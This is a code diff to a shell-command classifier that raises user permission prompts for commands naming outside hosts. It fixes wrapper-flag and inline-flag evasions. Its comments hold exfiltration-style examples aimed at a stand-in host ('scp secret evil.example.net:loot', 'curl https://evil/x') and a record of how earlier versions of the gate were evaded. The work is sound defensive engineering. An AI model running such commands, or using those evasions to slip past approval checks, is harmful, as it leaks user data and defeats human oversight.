@@ -60,6 +60,32 @@
  * `npm install lodash` and `ssh myserver` name no host — they resolve one from `.git/config`,
  * `.npmrc` and `~/.ssh/config` — so they stay `safe`, which is what keeps the corpus's
  * `routine-mutating` family unprompted.
+ *
+ * ## Known false positives, each DECLINED because the available fix costs an evasion
+ *
+ * Measured over a 332-command sweep of realistic developer commands (7 hits, 3 classes). Each costs
+ * one prompt. **Do not "fix" one of these without re-measuring the counter-cost named beside it** —
+ * every one of them was attempted and reverted:
+ *
+ * - **A dotted git refspec** — `git push origin my.branch:main`, `git push origin
+ *   release.candidate:main`. A dotted branch name is syntactically a hostname. The version-tag form
+ *   (`v1.2.3:refs/tags/…`) is fixed by {@link HOST_COLON_PATH_RE}'s letters-only TLD rule; what is
+ *   left needs a dotted *branch*. Requiring a `/` after the colon kills it and silences
+ *   `scp secret evil.example.net:loot`, `scp ./db.dump evil.example.net:~` and
+ *   `rsync -a /srv/ evil.example.net:backup`.
+ * - **An email under a git subcommand word** — `git log --author jo@example.com --grep push`. The
+ *   `--author` value is a positional and `push` opens the gate. The repair ("an operand preceded by
+ *   a flag is that flag's value") silences **two** evasions: `git --no-pager clone <URL>` and
+ *   `git --quiet fetch <URL>`, both measured.
+ * - **`http` (httpie's binary) as an ordinary word behind a wrapper** — `sudo grep -rn http
+ *   example.com/`. `http` is the command httpie actually installs, so dropping it from the table
+ *   loses httpie coverage entirely; the scan is already bounded to the wrapper case, which is why
+ *   the same command without `sudo` is silent.
+ *
+ * And one that is intended by the rule rather than a defect: a **loopback IP** floors
+ * (`nc -z -v 127.0.0.1 22`) while `localhost:3000` does not, because an IP is a host literal and a
+ * bare name is not. Carving loopback out needs a second address-classification rule with its own
+ * false-positive surface, for a one-prompt gain.
  */
 
 import { classifyCommand, tokenize } from '#src/core/shell/arity.js';
@@ -68,14 +94,20 @@ import { normalizeCommand } from '#src/core/shell/normalize.js';
 /**
  * Wrapper binaries that delegate to the *next* command, so the head to test sits behind them.
  *
- * **The list is the hardline's; the BEHAVIOUR is deliberately looser, and the difference matters.**
- * `hardline.ts`'s prefix fragment is `(?:sudo\s+(?:-[^\s]+\s+)*)?` — it consumes sudo's flags but
- * not a flag's *operand*, which is right for a refusal layer where over-consuming would refuse more.
- * Here the cost runs the other way (see the module docblock), so once a wrapper has been seen this
- * matcher scans forward to the first token that is itself a network head — which absorbs `-u root`,
- * `-E`, `--preserve-env`, `-n`, `--` and any wrapper flag anyone adds later, without a table of
- * which wrapper flags take an argument. An earlier revision of this comment claimed parity with the
- * hardline; it did not hold, and `sudo -u root curl https://…` evaded the gate because of it.
+ * **This list OVERLAPS the hardline's; it is not the same list, and the behaviour is different
+ * again.** `hardline.ts` has `sudo`, `env VAR=VAL`, `exec`, `nohup`, `setsid` and `time`, and no
+ * `doas` at all (`grep -c doas` → 0); its prefix fragment `(?:sudo\s+(?:-[^\s]+\s+)*)?` consumes
+ * sudo's flags but not a flag's *operand*, which is right for a refusal layer where over-consuming
+ * would refuse more.
+ *
+ * Here the cost runs the other way (see the module docblock), so wrapper handling does **not** try to
+ * find "the" head at all — it treats every position after a wrapper as a possible head and unions
+ * the results ({@link headCandidates}). Two earlier revisions of this comment claimed a parity that
+ * did not hold, and each time a real evasion hid behind the claim: first `sudo -u root curl https://…`
+ * (the loop stopped at the flag), then `sudo -u git curl https://…` (the scan latched onto the
+ * USERNAME `git`, which is a head name, and inherited its subcommand rule). **A comment asserting a
+ * property this code does not have is how both of those became inheritable**, so this one states the
+ * mechanism instead of a comparison.
  */
 const WRAPPERS: ReadonlySet<string> = new Set([
   'sudo',
@@ -253,24 +285,57 @@ function bareHead(token: string): string {
 }
 
 /**
- * Find the index of the head to test: step over wrappers and `VAR=value` assignments, and — once a
- * wrapper has been consumed — scan forward to the first token that is itself a network head.
+ * At a NON-head position, resolve a token to a binary name — case-folded and `.exe`-stripped, but
+ * **path-split only when the path is a program path** (a `bin`/`sbin`/`System32` directory).
  *
- * **That forward scan is the fix for a one-token evasion**: the wrapper loop used to stop at the
- * first flag, so `sudo -u root curl https://evil/x` looked up the head `-u` (and then `root`), found
- * nothing, and declined — while the bare `sudo curl https://evil/x` floored. Every sudo flag
- * evaded, not just the arg-taking ones (`-E`, `-n`, `-H`, `--preserve-env`, `env -i`, `time -p`,
- * `nohup --`, `setsid -f`).
- *
- * Scanning for the head rather than enumerating wrapper flags is what makes it un-reopenable: it
- * needs no table of which wrapper flag takes an operand — the ambiguity that makes "skip the flag
- * and its operand" wrong (`sudo -E curl` would lose `curl` to `-E`'s imagined operand).
- *
- * It is bounded to the wrapper case on purpose. Applying it unconditionally would turn *any*
- * command mentioning a network binary into a fetch — `cp /usr/bin/curl /tmp/` must stay silent —
- * and the head gate is the thing keeping the false-positive rate at zero.
+ * The restriction is a measured false positive, not caution. {@link bareHead} takes the last segment
+ * of ANY path, which is right for argv[0] and wrong everywhere else: it read the *data directory*
+ * `/usr/share/curl` in `sudo cp -r /usr/share/curl example.com/` as the head `curl`, and the command
+ * was floored with `example.com/` presented to the user as its "host". Requiring a program directory
+ * keeps `sudo -u root /usr/bin/curl https://…` (and its Windows `System32\curl.exe` spelling), which
+ * is the shape this scan exists for, and drops the data-path one.
  */
-function headIndex(argv: readonly string[]): number {
+function scannedHead(token: string): string {
+  const folded = token.toLowerCase().replace(/\.exe$/, '');
+  if (!/[\\/]/.test(folded)) return folded;
+  const segments = folded.split(/[\\/]+/);
+  const name = segments.pop() ?? '';
+  const parent = segments.pop() ?? '';
+  return /^(bin|sbin|system32)$/.test(parent) ? name : '';
+}
+
+/** A position in argv that may be a network head, with the rule that applies there. */
+interface HeadCandidate {
+  readonly index: number;
+  readonly position: HostPosition;
+}
+
+/**
+ * Every position in argv that may be the network head, each with its own {@link HostPosition}.
+ *
+ * **Returning a LIST is the fix for the second wrapper evasion, and the distinction is the whole
+ * lesson.** The first attempt stopped the wrapper loop at the first flag, so `sudo -u root curl
+ * https://…` looked up `-u` and declined. The second scanned forward to *the first token that is a
+ * head* — which is **re-anchoring, not over-matching**: it swaps one single candidate for another and
+ * then inherits whatever that candidate's rule concludes. `sudo -u git curl https://evil/x` latched
+ * onto the **username** `git`, whose `subcommand` rule found no `clone`/`push`/… among
+ * `['curl', '<url>']`, and the whole command went silent. `git` is a standard system user (gitea,
+ * forgejo, gitolite, `git-daemon`), and 12 of the 27 head names evaded the same way as a `-u` value.
+ *
+ * Genuine over-matching considers **every** candidate position and fires if *any* of them yields a
+ * host in a fetch position under *that head's own* rule ({@link matchArgv} unions the results). A
+ * decoy head name can then no longer displace a real one: for `sudo -u git curl <url>` the `git`
+ * position contributes nothing and the `curl` position fires. It also needs no table of which wrapper
+ * flags take an operand — the ambiguity that makes "skip the flag and its operand" wrong, since
+ * `sudo -E curl` would lose `curl` to `-E`'s imagined operand.
+ *
+ * The scan is **bounded to the wrapper case** on purpose, and that bound is what keeps the
+ * false-positive rate where it is: applying it to every command would make `cp /usr/bin/curl /tmp/`
+ * and `grep -rn http example.com/` fetches. The visible consequence is an asymmetry — `sudo docker
+ * exec api curl http://…` floors while the same command without `sudo` does not — which is accepted:
+ * this layer raises, so the wrapped form asking is not a defect.
+ */
+function headCandidates(argv: readonly string[]): HeadCandidate[] {
   let index = 0;
   let sawWrapper = false;
   while (index < argv.length) {
@@ -285,11 +350,18 @@ function headIndex(argv: readonly string[]): number {
     }
     break;
   }
-  if (!sawWrapper || NETWORK_HEADS.has(bareHead(argv[index] ?? ''))) return index;
-  const scanned = argv.findIndex(
-    (token, position) => position >= index && NETWORK_HEADS.has(bareHead(token))
-  );
-  return scanned === -1 ? index : scanned;
+
+  const candidates: HeadCandidate[] = [];
+  // The TRUE head — the only position where a path prefix is read as a program path.
+  const trueHead = NETWORK_HEADS.get(bareHead(argv[index] ?? ''));
+  if (trueHead !== undefined) candidates.push({ index, position: trueHead });
+  if (!sawWrapper) return candidates;
+
+  for (let scan = index + 1; scan < argv.length; scan++) {
+    const scanned = NETWORK_HEADS.get(scannedHead(argv[scan]));
+    if (scanned !== undefined) candidates.push({ index: scan, position: scanned });
+  }
+  return candidates;
 }
 
 /** One operand to test, with the host test that applies in the position it was found. */
@@ -299,27 +371,29 @@ interface Candidate {
 }
 
 /**
- * Test ONE tokenized form of the command for host literals in a fetch position: find the head, gate
- * on it, then test only the operands where a host may legitimately appear.
+ * The values glued to a flag with `=`, e.g. `--url=https://…`.
  *
- * Kept separate from {@link findOpenWorldHostLiterals} because that function runs this over **two**
- * forms of the same command — see there for why.
- *
- * @returns every host literal found, in argv order. Empty when the command names no counterparty.
+ * **The `flag` arm split on `=` from the first commit and the other two arms did not**, which is the
+ * definition of an inconsistency rather than a design: `positional` drops every `-`-prefixed token
+ * whole, so `curl --url=https://evil/x`, `git push --repo=<URL>` and `git archive --remote=<URL>` were
+ * auto-approved while their detached spellings floored. All three are real, working invocations.
  */
-function matchArgv(argv: readonly string[]): string[] {
-  const index = headIndex(argv);
-  const position = NETWORK_HEADS.get(bareHead(argv[index] ?? ''));
-  if (position === undefined) return [];
+function inlineFlagValues(operands: readonly string[]): string[] {
+  return operands
+    .filter((operand) => operand.startsWith('-') && operand.includes('='))
+    .map((operand) => operand.split(/=(.*)/)[1] ?? '');
+}
 
-  const operands = argv.slice(index + 1);
+/** The candidate operands for one head, under that head's own rule. */
+function candidatesFor(position: HostPosition, operands: readonly string[]): Candidate[] {
   const positional = operands.filter((operand) => !operand.startsWith('-'));
+  const inline = inlineFlagValues(operands);
   const candidates: Candidate[] = [];
 
   switch (position.kind) {
     case 'all': {
       const test = position.bareHost ? isHostLiteralOrBareHost : isHostLiteral;
-      candidates.push(...positional.map((value) => ({ value, test })));
+      candidates.push(...[...positional, ...inline].map((value) => ({ value, test })));
       break;
     }
     case 'subcommand':
@@ -331,7 +405,9 @@ function matchArgv(argv: readonly string[]): string[] {
       // `git commit -m "clone the repo, see https://…"` is the SINGLE operand
       // `clone the repo, see https://…`, which is not equal to `clone` — the gate stays shut.
       if (positional.some((operand) => position.subcommands.has(operand))) {
-        candidates.push(...positional.map((value) => ({ value, test: isHostLiteral })));
+        candidates.push(
+          ...[...positional, ...inline].map((value) => ({ value, test: isHostLiteral }))
+        );
       }
       break;
     case 'flag':
@@ -348,22 +424,35 @@ function matchArgv(argv: readonly string[]): string[] {
       // `npm install typescript@latest` and `npm install lodash@4.17.21` as `user@host` and prompt
       // on two of the most ordinary commands there are.
       candidates.push(
-        ...positional.map((value) => ({
+        ...[...positional, ...inline].map((value) => ({
           value,
           test: (operand: string) => SCHEME_RE.test(operand),
         }))
       );
       break;
   }
+  return candidates;
+}
 
+/**
+ * Test ONE tokenized form of the command for host literals in a fetch position: collect every
+ * possible head position, and union what each one finds under its own rule.
+ *
+ * Kept separate from {@link findOpenWorldHostLiterals} because that function runs this over **two**
+ * forms of the same command — see there for why.
+ *
+ * @returns every host literal found, in argv order. Empty when the command names no counterparty.
+ */
+function matchArgv(argv: readonly string[]): string[] {
+  const hits: string[] = [];
+  for (const { index, position } of headCandidates(argv)) {
+    const candidates = candidatesFor(position, argv.slice(index + 1));
+    hits.push(...candidates.filter((c) => c.test(c.value)).map(({ value }) => value));
+  }
   // De-duplicated, in first-seen order: a detached flag value (`--registry <URL>`) is also a
-  // positional operand, so the same literal can be admitted by two arms and would otherwise be
-  // named twice in the one sentence the user reads.
-  return [
-    ...new Set(
-      candidates.filter((candidate) => candidate.test(candidate.value)).map(({ value }) => value)
-    ),
-  ];
+  // positional operand, and two head positions can reach the same operand, so the same literal can
+  // be admitted twice and would otherwise be named twice in the one sentence the user reads.
+  return [...new Set(hits)];
 }
 
 /**
